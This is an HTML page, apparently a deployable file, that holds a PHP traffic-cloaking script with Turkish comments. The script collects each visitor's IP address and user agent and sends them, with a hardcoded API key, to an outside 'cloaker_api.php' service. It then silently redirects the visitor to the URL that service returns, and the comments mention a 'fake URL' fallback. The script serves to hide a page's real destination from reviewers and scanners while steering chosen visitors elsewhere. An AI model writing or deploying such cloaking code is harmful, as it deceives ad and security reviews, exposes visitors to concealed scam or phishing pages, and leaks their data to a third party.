<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Başlıksız Belge</title>
</head>
<?php
// API Ayarları
$apiKey = 'bf3049b0349d141ce01c3c31c8f818be2417f2307312ec9f54ae863820b30181';
$apiUrl = 'https://hayalimbilgi.site/proje1/api/cloaker_api.php';

// Ziyaretçi IP'sini al (gerçek IP'yi almak için)
function getRealVisitorIP() {
    // Önce güvenilir proxy header'larını kontrol et
    $headers = [
        'HTTP_CF_CONNECTING_IP',      // Cloudflare
        'HTTP_X_REAL_IP',              // Nginx reverse proxy
        'HTTP_CLIENT_IP',              // Bazı proxy'ler
        'HTTP_X_FORWARDED_FOR',        // Genel proxy header
    ];
    
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = trim($_SERVER[$header]);
            // Virgülle ayrılmış IP'ler varsa ilkini al
            if (strpos($ip, ',') !== false) {
                $ip = trim(explode(',', $ip)[0]);
            }
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    
    // Son çare olarak REMOTE_ADDR
    if (!empty($_SERVER['REMOTE_ADDR'])) {
        return $_SERVER['REMOTE_ADDR'];
    }
    
    return null;
}

// Ziyaretçi bilgilerini al
$visitorIP = getRealVisitorIP();
$visitorUA = $_SERVER['HTTP_USER_AGENT'] ?? '';

// API'ye istek gönder
$ch = curl_init($apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'X-API-Key: ' . $apiKey,
    'X-Visitor-IP: ' . $visitorIP,        // ✅ Ziyaretçi IP'si eklendi
    'X-Visitor-UA: ' . $visitorUA,        // ✅ User-Agent eklendi
    'Content-Type: application/json'
]);

// Alternatif olarak JSON body ile de gönderebilirsiniz:
$postData = json_encode([
    'visitor_ip' => $visitorIP,
    'visitor_ua' => $visitorUA
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Hata kontrolü
if ($curlError) {
    error_log("Cloaker API cURL Error: " . $curlError);
    // Hata durumunda varsayılan davranış (normal sayfayı göster)
    // veya fake URL'ye yönlendir
}

$data = json_decode($response, true);

if ($data && $data['status'] === 'ok') {
    // Yönlendirme yap
    header('Location: ' . $data['redirect_url']);
    exit;
} else {
    // API hatası - varsayılan davranış
    // Normal sayfayı göster veya fake URL'ye yönlendir
    error_log("Cloaker API Error: " . ($data['message'] ?? 'Unknown error'));
}
?>
<body>
</body>
</html>






